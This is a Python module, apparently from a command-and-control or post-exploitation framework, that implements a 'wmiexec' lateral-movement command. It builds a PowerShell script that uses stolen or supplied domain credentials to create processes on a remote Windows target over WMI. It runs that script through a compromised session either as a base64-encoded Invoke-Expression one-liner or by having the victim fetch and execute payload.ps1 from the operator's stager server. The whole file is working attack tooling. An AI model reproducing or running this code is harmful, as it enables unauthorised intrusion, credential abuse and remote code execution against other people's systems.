import sys
import os
import subprocess
import base64
from core.session_handlers import session_manager
from core import shell
from core import stager_server as stage

# Command Execution Imports
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

# Colorama Settings
from colorama import Style, Fore
brightgreen = Style.BRIGHT + Fore.GREEN
brightyellow = Style.BRIGHT + Fore.YELLOW
brightred   = Style.BRIGHT + Fore.RED
brightcyan  = Style.BRIGHT + Fore.CYAN
reset = Style.RESET_ALL

def wmiexec(sid, username, password, domain, target, command, stage_ip,
    debug=False, stager=False, stage_port=8000, op_id="console"):
    ps = f"""
$T = '{target}'
try {{
    $name = [System.Net.Dns]::GetHostEntry($T).HostName
  }} catch {{
    $name = $T
  }}

$sec  = ConvertTo-SecureString '{password}' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('{domain}\\{username}', $sec)

$cs   = New-CimSession -ComputerName "$name" -Credential $cred -ErrorAction Stop

$result = Invoke-CimMethod -CimSession $cs -Namespace root\\cimv2 -ClassName Win32_Process -MethodName Create -Arguments @{{ CommandLine = "{command}" }}

Write-Output ("WMIEXEC    {{0,-7}} Return={{1}}" -f $result.ProcessId, $result.ReturnValue)
"""

    # encode & dispatch exactly like your other PS‐based function


    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
    one_liner = (
        "$ps = [System.Text.Encoding]::Unicode"
        f".GetString([Convert]::FromBase64String(\"{b64}\")); "
        "Invoke-Expression $ps"
    )

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"

    transport = sess.transport.lower()
    out = None

    if stager:
        u = f"http://{stage_ip}:{stage_port}/payload.ps1"
        ps_cmd = (
            f"$u='{u}';"
            "$xml=New-Object -ComObject 'MSXML2.ServerXMLHTTP.6.0';"
            "$xml.open('GET',$u,$false);"
            "$xml.send();"
            "IEX $xml.responseText"
        )

        stage.start_stager_server(stage_port, ps)

        if transport in ("http", "https"):
            out = http_exec.run_command_http(sid, ps_cmd, op_id=op_id)

        elif transport in ("tcp", "tls"):
            out = tcp_exec.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True, op_id=op_id)

        else:
            return brightred + "[!] Unknown session transport!"

    else:
        if transport in ("http", "https"):
            out = http_exec.run_command_http(sid, one_liner, op_id=op_id)

        elif transport in ("tcp", "tls"):
            out = tcp_exec.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)

        else:
            return brightred + "[!] Unknown session transport!"

    if out:
        if "WMIEXEC" in out:
            lines = [l for l in out.splitlines() if l.startswith("WMIEXEC")]
            if lines:
                formatted_lines = "\n".join(lines)
                if "Return=0" in formatted_lines:
                    return brightgreen + "Successfully executed command on remote target via WMI"

                else:
                    if debug:
                        return formatted_lines + f"\n\n{out}"

                    else:
                        return brightred + f"[!] Failed to execute command, run with --debug for more info"

            else:
                if debug:
                    return brightred + f"[!] no WMIEXEC response\n\n{out}"

                else:
                    return brightred + "[!] no WMIEXEC response"

        elif "WMIEXEC" not in out and debug:
            return brightred + f"[!] no WMIEXEC response\n\n{out}"

        else:
            return brightred + "[!] no WMIEXEC response"

    else:
        return brightyellow + "[*] No output or host unreachable"